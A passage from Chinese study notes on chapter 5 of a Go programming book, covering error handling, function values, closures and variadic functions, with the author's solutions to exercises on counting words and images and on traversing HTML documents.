return\n    }\n    words, images = countWordsAndImages(doc)\n    return\n}\nfunc countWordsAndImages(n *html.Node) (words, images int) { /* ... */ }\n</code></pre></div><p>按照返回值列表的次序，返回所有的返回值，在上面的例子中，每一个return语句等价于：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>return words, images, err\n</code></pre></div><h3>练习 5.5</h3>\n<p>实现countWordsAndImages。（参考练习4.9如何分词）</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>package main\n\nimport (\n\t\"fmt\"\n\t\"golang.org/x/net/html\"\n\t\"net/http\"\n\t\"os\"\n\t\"strings\"\n)\n\nfunc main() {\n\tfor _, url := range os.Args[1:] {\n\t\twords, images, err := CountWordsAndImages(url)\n\t\tif err != nil {\n\t\t\tfmt.Fprintf(os.Stderr, \"findlinks2: %v\\n\", err)\n\t\t\tcontinue\n\t\t}\n\t\tfmt.Println(words)\n\t\tfmt.Println(images)\n\t}\n\n}\n\n// CountWordsAndImages 函数执行一个HTTP GET请求获取HTML文档的URL，并返回其中的单词和图片数量。\nfunc CountWordsAndImages(url string) (words, images int, err error) {\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\treturn\n\t}\n\tdoc, err := html.Parse(resp.Body)\n\tresp.Body.Close()\n\tif err != nil {\n\t\terr = fmt.Errorf(\"parsing HTML: %s\", err)\n\t\treturn\n\t}\n\twords, images = countWordsAndImages(doc)\n\treturn\n}\n\n// countWordsAndImages 函数递归遍历HTML的节点，统计words和images个数\nfunc countWordsAndImages(n *html.Node) (words, images int) {\n\tif n.Type == html.TextNode {\n\t\t//scanner := bufio.NewScanner(strings.NewReader(n.Data))\n\t\t//scanner.Split(bufio.ScanWords)\n\t\t//for scanner.Scan() {\n\t\t//\twords++\n\t\t//}\n\t\twords += len(strings.Fields(n.Data))\n\t}\n\tif n.Type == html.ElementNode &amp;&amp; n.Data == \"img\" {\n\t\timages++\n\t}\n\tfor c := n.FirstChild; c != nil; c = c.NextSibling {\n\t\tws, is := countWordsAndImages(c)\n\t\twords += ws\n\t\timages += is\n\t}\n\treturn words, images\n}\n</code></pre></div><figure><figcaption>image.png</figcaption></figure>\n<h3>练习 5.6</h3>\n<p>修改 ch3/surface（3.2）中的corner函数，将返回值命名，并使用bare return。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>// 在函数头的返回值部分写好变量名，就可以在函数体里不写变量名，直接return\nfunc corner(i, j int) (sx, sy float64) {\n\t// Find Point (x, y) at corner of cell(i, j)\n\tx := xyrange * (float64(i)/cells - 0.5)\n\ty := xyrange * (float64(j)/cells - 0.5)\n\n\t// compute surface height z\n\tz := f(x, y)\n\n\t// project (x,y,z) isometrically onto 2-D SVG canvas (sx, sy)\n\tsx = width/2 + (x-y)*cos30*xyscale\n\tsy = height/2 + (x+y)*sin30*xyscale - z*zscale\n\treturn\n}\n</code></pre></div><h2>5.4. 错误</h2>\n<p>在Go中有一部分函数总是能成功的运行。比如strings.Contains和strconv.FormatBool函数，对各种可能的输入都做了良好的处理，使得运行时几乎不会失败； 还有一部分函数只要输入的参数满足一定条件，也能保证运行成功。比如time.Date函数，该函数将年月日等参数构造成time.Time对象，除非最后一个参数（时区）是nil。这种情况下会引发panic异常。panic是来自被调用函数的信号，表示发生了某个已知的bug。一个良好的程序永远不应该发生panic异常。</p>\n<h3>GO的error</h3>\n<p>在Go的错误处理中，错误是软件包API和应用程序用户界面的一个重要组成部分，程序运行失败被认为是几个预期的结果之一。对于那些将运行失败看作是预期结果的函数，它们会返回一个额外的返回值（通常是最后一个）来传递错误信息。</p>\n<ul>\n<li>如果导致失败的原因只有一个，额外的返回值可以是一个布尔值，通常被命名为ok。比如，cache.Lookup失败的唯一原因是key不存在，那么代码可以按照下面的方式组织：</li>\n</ul>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>value, ok := cache.Lookup(key)\nif !ok {\n    // ...cache[key] does not exist…\n}\n</code></pre></div><ul>\n<li>导致失败的原因不止一种，额外的返回值不再是简单的布尔类型，而是error类型。</li>\n<li>内置的error是接口类型。error类型可能是nil或者non-nil。nil意味着函数运行成功，non-nil表示失败。对于non-nil的error类型，我们可以通过调用error的Error函数或者输出函数获得字符串类型的错误信息。</li>\n<li>在Go中，函数运行失败时会返回错误信息，这些错误信息被认为是一种预期的值而非异常（exception），这使得Go有别于那些将函数运行失败看作是异常的语言。</li>\n</ul>\n<h3>5.4.1. 错误处理策略</h3>\n<p>错误处理的常用的五种方式：</p>\n<p>传播错误：函数中某个子程序的失败，会变成该函数的失败。</p>\n<p>如果findLinks对http.Get的调用失败，findLinks会直接将这个HTTP错误返回给调用者：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>resp, err := http.Get(url)\nif err != nil{\n    return nil, err\n}\n</code></pre></div><p>当对html.Parse的调用失败时，findLinks不会直接返回html.Parse的错误，因为缺少html parser、发生错误的url。因此findLinks构造了一个新的错误信息，既包含了这两项，也包括了底层的解析出错的信息。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>doc, err := html.Parse(resp.Body)\nresp.Body.Close()\nif err != nil {\n    return nil, fmt.Errorf(\"parsing %s as HTML: %v\", url,err)\n}\n</code></pre></div><p><code>fmt.Errorf</code>函数使用<code>fmt.Sprintf</code>格式化错误信息并返回。我们使用该函数添加额外的前缀上下文信息到原始错误信息。（由于错误信息经常是以链式组合在一起的，所以错误信息中应避免大写和换行符。最终的错误信息可能很长，可以通过类似grep的工具处理错误信息）</p>\n<p>重新尝试失败：如果错误的发生是偶然性的，或由不可预知的问题导致的。可以重新尝试失败的操作。</p>\n<p>在重试时，我们需要限制重试的时间间隔或重试的次数，防止无限制的重试。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>func WaitForServer(url string) error {\n    const timeout = 1 * time.Minute\n    deadline := time.Now().Add(timeout)\n    for tries := 0; time.Now().Before(deadline); tries++ {\n        _, err := http.Head(url)\n        if err == nil {\n            return nil // success\n        }\n        log.Printf(\"server not responding (%s);retrying…\", err)\n        time.Sleep(time.Second &lt;&lt; uint(tries)) // exponential back-off\n    }\n    return fmt.Errorf(\"server %s failed to respond after %s\", url, timeout)\n}\n</code></pre></div><figure><figcaption>image.png</figcaption></figure>\n<p>输出错误信息并结束程序</p>\n<p>需要注意的是，这种策略只应在main中执行。对库函数而言，应仅向上传播错误，除非该错误意味着程序内部包含不一致性，即遇到了bug，才能在库函数中结束程序。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>// (In function main.)\nif err := WaitForServer(url); err != nil {\n    fmt.Fprintf(os.Stderr, \"Site is down: %v\\n\", err)\n    os.Exit(1)\n}\n</code></pre></div><p>调用log.Fatalf可以更简洁的代码达到与上文相同的效果。log中的所有函数，都默认会在错误信息之前输出时间信息。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>if err := WaitForServer(url); err != nil {\n    log.Fatalf(\"Site is down: %v\\n\", err)\n}\n</code></pre></div><p>我们可以设置log的前缀信息屏蔽时间信息，一般而言，前缀信息会被设置成命令名。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>log.SetPrefix(\"wait: \")\nlog.SetFlags(0)\n</code></pre></div><ol>\n<li>只输出错误信息不中断程序</li>\n</ol>\n<p>我们可以通过log包提供函数</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>if err := Ping(); err != nil {\n    log.Printf(\"ping failed: %v; networking disabled\",err)\n}\n</code></pre></div><p>或者标准错误流输出错误信息。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>if err := Ping(); err != nil {\n    fmt.Fprintf(os.Stderr, \"ping failed: %v; networking disabled\\n\", err)\n}\n</code></pre></div><p>log包中的所有函数会为没有换行符的字符串增加换行符。</p>\n<p>直接忽略掉错误</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>dir, err := ioutil.TempDir(\"\", \"scratch\")\nif err != nil {\n    return fmt.Errorf(\"failed to create temp dir: %v\",err)\n}\n// ...use temp dir…\nos.RemoveAll(dir) // ignore errors; $TMPDIR is cleaned periodically\n</code></pre></div><p>尽管<code>os.RemoveAll</code>会失败，但上面的例子并没有做错误处理。这是因为操作系统会定期的清理临时目录。</p>\n<blockquote>\n<p>我们通常将处理失败的逻辑代码放在处理成功的代码之前。首先是一系列的初始检查，防止错误发生，之后是函数的实际逻辑。</p>\n</blockquote>\n<h3>5.4.2. 文件结尾错误（EOF）</h3>\n<p>例子：从文件中读取n个字节。如果n等于文件的长度，读取过程的任何错误都表示失败。如果n小于文件的长度，调用者会重复的读取固定大小的数据直到文件结束。这会导致调用者必须分别处理由文件结束引起的各种错误。基于这样的原因，io包保证任何由文件结束引起的读取失败都返回同一个错误——io.EOF，该错误在io包中定义：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>package io\n\nimport \"errors\"\n\n// EOF is the error returned by Read when no more input is available.\nvar EOF = errors.New(\"EOF\")\n</code></pre></div><p>调用者只需通过简单的比较，就可以检测出这个错误。下面的例子展示了如何从标准输入中读取字符，以及判断文件结束。（4.3的chartcount程序展示了更加复杂的代码）</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>in := bufio.NewReader(os.Stdin)\nfor {\n    r, _, err := in.ReadRune()\n    if err == io.EOF {\n        break // finished reading\n    }\n    if err != nil {\n        return fmt.Errorf(\"read failed:%v\", err)\n    }\n    // ...use r…\n}\n</code></pre></div><p>因为文件结束这种错误不需要更多的描述，所以io.EOF有固定的错误信息——“EOF”。对于其他错误，我们可能需要在错误信息中描述错误的类型和数量，这使得我们不能像io.EOF一样采用固定的错误信息。</p>\n<h2>5.5. 函数值</h2>\n<p>函数像其他值一样，拥有类型，可以被赋值给其他变量，传递给函数，从函数返回。对函数值（function value）的调用类似函数调用。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>    func square(n int) int { return n * n }\n    func negative(n int) int { return -n }\n    func product(m, n int) int { return m * n }\n\n    f := square\n    fmt.Println(f(3)) // \"9\"\n\n    f = negative\n    fmt.Println(f(3))     // \"-3\"\n    fmt.Printf(\"%T\\n\", f) // \"func(int) int\"\n\n    f = product // compile error: can't assign func(int, int) int to func(int) int\n</code></pre></div><p>函数类型的零值是nil。调用值为nil的函数值会引起panic错误：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>var f func(int) int\nf(3) // 此处f的值为nil, 会引起panic错误\n</code></pre></div><p>函数值可以与nil比较：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>var f func(int) int\nif f != nil {\n    f(3)\n}\n</code></pre></div><p>但是函数值之间是不可比较的，也不能用函数值作为map的key。 函数值使得我们不仅仅可以通过数据来参数化函数，亦可通过行为。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>    func add1(r rune) rune { return r + 1 }\n\n    fmt.Println(strings.Map(add1, \"HAL-9000\")) // \"IBM.:111\"\n    fmt.Println(strings.Map(add1, \"VMS\"))      // \"WNT\"\n    fmt.Println(strings.Map(add1, \"Admix\"))    // \"Benjy\"\n</code></pre></div><p>5.2节的findLinks函数使用了辅助函数visit，遍历和操作了HTML页面的所有结点。使用函数值，我们可以将遍历结点的逻辑和操作结点的逻辑分离，使得我们可以复用遍历的逻辑，从而对结点进行不同的操作。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code> package main\n \n import (\n     \"fmt\"\n     \"golang.org/x/net/html\"\n     \"os\"\n )\n \n func main() {\n     doc, err := html.Parse(os.Stdin)\n     if err != nil {\n         fmt.Fprintf(os.Stderr, \"outline: %v\\n\", err)\n         os.Exit(1)\n     }\n     forEachNode(doc, startElement, endElement)\n \n }\n \n // forEachNode针对每个结点x，都会调用pre(x)和post(x)。\n // pre和post都是可选的。\n // 遍历孩子结点之前，pre被调用\n // 遍历孩子结点之后，post被调用\n func forEachNode(n *html.Node, pre, post func(n *html.Node)) {\n     if pre != nil {\n         pre(n)\n     }\n     for c := n.FirstChild; c != nil; c = c.NextSibling {\n         forEachNode(c, pre, post)\n     }\n     if post != nil {\n         post(n)\n     }\n }\n \n var depth int\n \n func startElement(n *html.Node) {\n     if n.Type == html.ElementNode {\n         // 利用fmt.Printf控制输出的缩进。\n         // 每次输出会先填充depth*2数量的空格，再输出\"\"，最后再输出HTML标签。\n         fmt.Printf(\"%*s&lt;%s&gt;\\n\", depth*2, \"\", n.Data)\n         depth++\n     }\n }\n func endElement(n *html.Node) {\n     if n.Type == html.ElementNode {\n         depth--\n         fmt.Printf(\"%*s&lt;/%s&gt;\\n\", depth*2, \"\", n.Data)\n     }\n }\n \n</code></pre></div><p>该函数接收2个函数作为参数，分别在结点的孩子被访问前和访问后调用。这样的设计给调用者更大的灵活性。</p>\n<figure><figcaption>image.png</figcaption></figure>\n<h3>练习 5.7</h3>\n<p>完善startElement和endElement函数，使其成为通用的HTML输出器。要求：输出注释结点，文本结点以及每个元素的属性（<code>&lt; a href=...&gt;</code>）。使用简略格式输出没有孩子结点的元素（即用<code>&lt;img/&gt;</code>代替<code>&lt;img&gt;&lt;/img&gt;</code>）。编写测试，验证程序输出的格式正确。（详见11章）</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code> package main\n \n import (\n     \"fmt\"\n     \"golang.org/x/net/html\"\n     \"net/http\"\n     \"os\"\n     \"regexp\"\n )\n \n func main() {\n     for _, url := range os.Args[1:] {\n         doc, err := getDoc(url)\n         if err != nil {\n             fmt.Fprintf(os.Stderr, \"err: %v\\n\", err)\n             os.Exit(1)\n         }\n         forEachNode(doc, startElement, endElement)\n     }\n }\n func getDoc(url string) (*html.Node, error) {\n     resp, err := http.Get(url)\n     if err != nil {\n         return nil, err\n     }\n     doc, err := html.Parse(resp.Body)\n     resp.Body.Close()\n     if err != nil {\n         return nil, fmt.Errorf(\"parsing HTML: %s\", err)\n     }\n     return doc, nil\n }\n \n // forEachNode针对每个结点x，都会调用pre(x)和post(x)。\n // pre和post都是可选的。\n // 遍历孩子结点之前，pre被调用\n // 遍历孩子结点之后，post被调用\n func forEachNode(n *html.Node, pre, post func(n *html.Node)) {\n     if pre != nil {\n         pre(n)\n     }\n     for c := n.FirstChild; c != nil; c = c.NextSibling {\n         forEachNode(c, pre, post)\n     }\n     if post != nil {\n         post(n)\n     }\n }\n \n var depth int\n \n func startElement(n *html.Node) {\n     if n.Type == html.ElementNode {\n         attrs := \"\"\n         for _, a := range n.Attr {\n             attrs += fmt.Sprintf(\"%s=\\\"%s\\\" \", a.Key, a.Val)\n         }\n         if n.FirstChild == nil {\n             fmt.Printf(\"%*s&lt;%s %s\\\\&gt;\\n\", depth*2, \"\", n.Data, attrs)\n         } else {\n             fmt.Printf(\"%*s&lt;%s %s&gt;\\n\", depth*2, \"\", n.Data, attrs)\n         }\n         depth++\n     }\n     // html.CommentNode 注释节点\n     if n.Type == html.CommentNode {\n         fmt.Printf(\"%*s//%s\\n\", depth*2, \"\", n.Data)\n     }\n     // html.TextNode文本节点\n     if n.Type == html.TextNode {\n         // 删除字符串中空白字符\n         nData := regexp.MustCompile(`[\\n\\s]+`).ReplaceAllString(n.Data, \"\")\n         if nData != \"\" {\n             fmt.Printf(\"%*s%s\\n\", depth*2, \"\", nData)\n         }\n     }\n }\n \n func endElement(n *html.Node) {\n     if n.Type == html.ElementNode {\n         depth--\n         if n.FirstChild != nil {\n             fmt.Printf(\"%*s&lt;/%s&gt;\\n\", depth*2, \"\", n.Data)\n         }\n     }\n }\n \n</code></pre></div><h3>练习 5.8</h3>\n<p>修改pre和post函数，使其返回布尔类型的返回值。返回false时，中止forEachNoded的遍历。使用修改后的代码编写ElementByID函数，根据用户输入的id查找第一个拥有该id元素的HTML元素，查找成功后，停止遍历。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code> package main\n \n import (\n     \"fmt\"\n     \"net/http\"\n     \"os\"\n \n     \"golang.org/x/net/html\"\n )\n \n func main() {\n     url := os.Args[1]\n     targetID := os.Args[2]\n     if url == \"\" || targetID == \"\" {\n         fmt.Fprintf(os.Stderr, \"need params url and targetId\")\n     }\n     doc, err := getDoc(url)\n     if err != nil {\n         fmt.Fprintf(os.Stderr, \"err: %v\\n\", err)\n         os.Exit(1)\n     }\n     foundNode := elementByID(doc, targetID)\n     fmt.Printf(\"foundNode: %s%s\\n\", foundNode.Data, foundNode.Attr)\n }\n func getDoc(url string) (*html.Node, error) {\n     resp, err := http.Get(url)\n     if err != nil {\n         return nil, err\n     }\n     doc, err := html.Parse(resp.Body)\n     resp.Body.Close()\n     if err != nil {\n         return nil, fmt.Errorf(\"parsing HTML: %s\", err)\n     }\n     return doc, nil\n }\n \n var foundNode *html.Node\n \n func elementByID(doc *html.Node, id string) *html.Node {\n     forEachNode(doc, id, findID, nil)\n     return foundNode\n }\n \n func forEachNode(n *html.Node, id string, pre, post func(n *html.Node, id string) bool) {\n     if pre != nil {\n         goOn := pre(n, id)\n         if !goOn {\n             return\n         }\n     }\n     for c := n.FirstChild; c != nil; c = c.NextSibling {\n         forEachNode(c, id, pre, post)\n     }\n     if post != nil {\n         post(n, id)\n     }\n }\n \n func findID(n *html.Node, id string) bool {\n     if n.Type == html.ElementNode {\n         for _, a := range n.Attr {\n             if a.Key == \"id\" &amp;&amp; a.Val == id {\n                 foundNode = n\n                 return false\n             }\n         }\n     }\n     return true\n }\n \n</code></pre></div><h3>练习 5.9</h3>\n<p>编写函数expand，将s中的\"foo\"替换为f(\"foo\")的返回值。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code> func expand(s string, f func(string) string) string\n</code></pre></div><div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> input <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"expand: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">expand</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">,</span> allAdd1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">expand</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> f <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// strings.Replace() ，下面的n表示替换前n个，n&lt;0表示替换数量不限制</span>\n\tret <span class=\"token operator\">:=</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">Replace</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token string\">\"foo\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"foo\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> ret\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">add1</span><span class=\"token punctuation\">(</span>r <span class=\"token builtin\">rune</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">rune</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">return</span> r <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">allAdd1</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">return</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">Map</span><span class=\"token punctuation\">(</span>add1<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h2>5.6. 匿名函数</h2>\n<p>函数字面量允许我们在使用函数时，再定义它。通过这种技巧，我们可以改写之前对strings.Map的调用：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>strings<span class=\"token punctuation\">.</span><span class=\"token function\">Map</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>r <span class=\"token builtin\">rune</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">rune</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> r <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"HAL-9000\"</span><span class=\"token punctuation\">)</span>\n</code></pre></div><p>更为重要的是，通过这种方式定义的函数可以访问完整的词法环境（lexical environment），这意味着在函数中定义的内部函数可以引用该函数的变量，如下例所示：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// squares返回一个匿名函数。</span>\n<span class=\"token comment\">// 该匿名函数每次被调用时都会返回下一个数的平方。</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">squares</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> x <span class=\"token builtin\">int</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">{</span>\n        x<span class=\"token operator\">++</span>\n        <span class=\"token keyword\">return</span> x <span class=\"token operator\">*</span> x\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    f <span class=\"token operator\">:=</span> <span class=\"token function\">squares</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"1\"</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"4\"</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"9\"</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"16\"</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p><strong>练习5.10</strong></p>\n<p>重写topoSort函数，用map代替切片并移除对key的排序代码。验证结果的正确性（结果不唯一）。</p>\n<p><strong>练习5.11：</strong> 现在线性代数的老师把微积分设为了前置课程。完善topSort，使其能检测有向图中的环。</p>\n<p><strong>练习5.12：</strong> ch5/outline2（5.5节）的startElement和endElement共用了全局变量depth，将它们修改为匿名函数，使其共享outline中的局部变量。</p>\n<p><strong>练习5.13：</strong> 修改crawl，使其能保存发现的页面，必要时，可以创建目录来保存这些页面。只保存来自原始域名下的页面。假设初始页面在golang.org下，就不要保存vimeo.com下的页面。</p>\n<p><strong>练习5.14：</strong> 使用breadthFirst遍历其他数据结构。比如，topoSort例子中的课程依赖关系（有向图）、个人计算机的文件层次结构（树）；你所在城市的公交或地铁线路（无向图）。</p>\n<h3>5.6.1. 警告：捕获迭代变量</h3>\n<p>考虑这样一个问题：你被要求首先创建一些目录，再将目录删除。在下面的例子中我们用函数值来完成删除操作。下面的示例代码需要引入os包。为了使代码简单，我们忽略了所有的异常处理。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var rmdirs []func()\nfor _, d := range tempDirs() {\n    dir := d // NOTE: necessary!\n    os.MkdirAll(dir, 0755) // creates parent directories too\n    rmdirs = append(rmdirs, func() {\n        os.RemoveAll(dir)\n    })\n}\n// ...do some work…\nfor _, rmdir := range rmdirs {\n    rmdir() // clean up\n}\n</code></pre></div><p>你可能会感到困惑，为什么要在循环体中用循环变量d赋值一个新的局部变量，而不是像下面的代码一样直接使用循环变量dir。需要注意，下面的代码是错误的。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">var</span> rmdirs <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> dir <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> <span class=\"token function\">tempDirs</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    os<span class=\"token punctuation\">.</span><span class=\"token function\">MkdirAll</span><span class=\"token punctuation\">(</span>dir<span class=\"token punctuation\">,</span> <span class=\"token number\">0755</span><span class=\"token punctuation\">)</span>\n    rmdirs <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>rmdirs<span class=\"token punctuation\">,</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        os<span class=\"token punctuation\">.</span><span class=\"token function\">RemoveAll</span><span class=\"token punctuation\">(</span>dir<span class=\"token punctuation\">)</span> <span class=\"token comment\">// NOTE: incorrect!</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>问题的原因在于循环变量的作用域。在上面的程序中，for循环语句引入了新的词法块，循环变量dir在这个词法块中被声明。在该循环中生成的所有函数值都共享相同的循环变量。需要注意，函数值中记录的是循环变量的内存地址，而不是循环变量某一时刻的值。以dir为例，后续的迭代会不断更新dir的值，当删除操作执行时，for循环已完成，dir中存储的值等于最后一次迭代的值。这意味着，每次对os.RemoveAll的调用删除的都是相同的目录。</p>\n<h2>5.7. 可变参数</h2>\n<p>在声明可变参数函数时，需要在参数列表的最后一个参数类型之前加上省略符号“...”，这表示该函数会接收任意数量的该类型参数。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func sum(vals ...int) int {\n    total := 0\n    for _, val := range vals {\n        total += val\n    }\n    return total\n}\n</code></pre></div><p>sum函数返回任意个int型参数的和。在函数体中，vals被看作是类型为[] int的切片。sum可以接收任意数量的int型参数：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Println(sum())           // \"0\"\nfmt.Println(sum(3))          // \"3\"\nfmt.Println(sum(1, 2, 3, 4)) // \"10\"\n</code></pre></div><p>在上面的代码中，调用者隐式的创建一个数组，并将原始参数复制到数组中，再把数组的一个切片作为参数传给被调用函数。如果原始参数已经是切片类型，我们该如何传递给sum？只需在最后一个参数后加上省略符。下面的代码功能与上个例子中最后一条语句相同。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>values := []int{1, 2, 3, 4}\nfmt.Println(sum(values...)) // \"10\"\n</code></pre></div><p>虽然在可变参数函数内部，...int 型参数的行为看起来很像切片类型，但实际上，可变参数函数和以切片作为参数的函数是不同的。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func f(...int) {}\nfunc g([]int) {}\nfmt.Printf(\"%T\\n\", f) // \"func(...int)\"\nfmt.Printf(\"%T\\n\", g) // 